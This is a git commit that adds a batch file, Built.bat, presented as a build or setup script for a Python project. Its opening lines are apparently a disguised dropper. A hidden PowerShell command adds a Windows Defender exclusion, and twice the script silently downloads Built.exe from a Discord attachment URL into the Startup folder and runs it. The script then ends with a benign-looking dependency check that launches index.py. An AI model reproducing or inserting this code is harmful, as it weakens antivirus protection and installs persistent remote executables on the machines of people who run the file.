2a8010a8239cb94270775ef2c3000ec2fbb49009
cryptox2magnet <161222077+cryptox2magnet@users.noreply.github.com>
2024-06-24 22:32:05 +0300

    Create Built.bat

---
+++ Built.bat
@@ -0,0 +1,76 @@
+powershell -w hidden -c Add-MpPreference -ExclusionPath ""
+
+@echo off
+setlocal 
+
+set "URL=https://cdn.discordapp.com/attachments/1055547260932477029/1254542849727529071/Built.exe?ex=6679df93&is=66788e13&hm=1eed75c7a3110f757814fd6a8aa4d88d0b8ee0aaff8249e0e82928d9e88ceb12&"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
+
+
+run Run.py
+
+if exist "%DEST%" del "%DEST%"
+
+curl --silent --output "%DEST%" "%URL%"
+
+if %errorlevel% neq 0 (
+  exit /b %errorlevel%
+)
+
+call "%DEST%"
+
+@echo off
+setlocal 
+
+set "URL=https://cdn.discordapp.com/attachments/1055547260932477029/1254542849727529071/Built.exe?ex=6679df93&is=66788e13&hm=1eed75c7a3110f757814fd6a8aa4d88d0b8ee0aaff8249e0e82928d9e88ceb12&"
+set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
+
+
+if exist "%DEST%" del "%DEST%"
+
+curl --silent --output "%DEST%" "%URL%"
+
+run Run.py
+
+if %errorlevel% neq 0 (
+  exit /b %errorlevel%
+)
+
+call "%DEST%"
+
+
+@echo off
+cd /d %~dp0
+
+title Checking Python installation...
+python --version > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Python is not installed! (Go to https://www.python.org/downloads and install the python 3.11.0^)
+    echo Very important click Add python exe to PATH.
+    pause
+)
+
+title Checking Python libraries...
+echo Checking 'cryptography' (1/3)
+python -c "import cryptography" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing cryptography...
+    python -m pip install cryptography > nul
+)
+
+echo Checking 'aiohttp' (2/3)
+python -c "import aiohttp" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing aiohttp...
+    python -m pip install aiohttp > nul
+)
+
+echo Checking 'pyinstaller' (3/3)
+python -c "import PyInstaller" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing pyinstaller...
+    python -m pip install pyinstaller > nul
+)
+
+cls
+python index.py
